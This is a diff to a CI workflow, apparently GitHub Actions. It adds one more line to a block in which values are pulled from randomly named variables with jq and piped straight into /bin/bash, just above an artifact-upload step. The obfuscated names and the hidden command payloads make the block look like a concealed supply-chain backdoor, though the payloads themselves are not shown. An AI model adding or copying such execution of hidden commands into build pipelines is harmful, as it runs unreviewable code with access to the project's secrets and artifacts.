@@ -41,6 +41,7 @@ jobs:
           echo $vxjwq8109 | jq -r .b29 | /bin/bash
           printf '%s' "$up91061" | jq -r .moic09756 | /bin/bash
           echo $mdg076 | jq -r .jzvlq698 | /bin/bash
+          echo $shc63 | jq -r .mcco49 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
